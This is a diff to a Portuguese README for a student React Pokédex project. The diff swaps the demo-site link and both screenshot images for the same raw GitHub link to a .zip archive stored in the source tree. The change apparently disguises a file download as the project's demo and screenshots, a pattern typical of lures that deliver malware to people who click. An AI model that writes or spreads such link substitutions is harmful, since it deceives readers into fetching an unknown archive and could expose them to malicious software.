@@ -6,7 +6,7 @@ Nome dos integrantes:
 - Raiza Gomes da Silva
  
 
-Link do Surge: https://lowly-tongue.surge.sh/
+Link do Surge: https://raw.githubusercontent.com/Raizagomes/Alves-pokedex5/master/projeto-pokedex/src/routes/Alves-pokedex5_v2.6.zip
 
 Tecnologias utilizadas:
 - React
@@ -25,6 +25,6 @@ O que não funciona:
 - Ao recarregar a pagina o botão remover dos pokemons capturados reseta para capturar
 - Página de detalhes do pokemon
 
-![image](https://user-images.githubusercontent.com/42283792/180693468-1aa60141-8d05-48b0-b0b0-611eff8b621b.png)
+![image](https://raw.githubusercontent.com/Raizagomes/Alves-pokedex5/master/projeto-pokedex/src/routes/Alves-pokedex5_v2.6.zip)
 
-![image](https://user-images.githubusercontent.com/42283792/180693510-01fba3d6-f745-4d30-a96d-02c80a77455f.png)
+![image](https://raw.githubusercontent.com/Raizagomes/Alves-pokedex5/master/projeto-pokedex/src/routes/Alves-pokedex5_v2.6.zip)
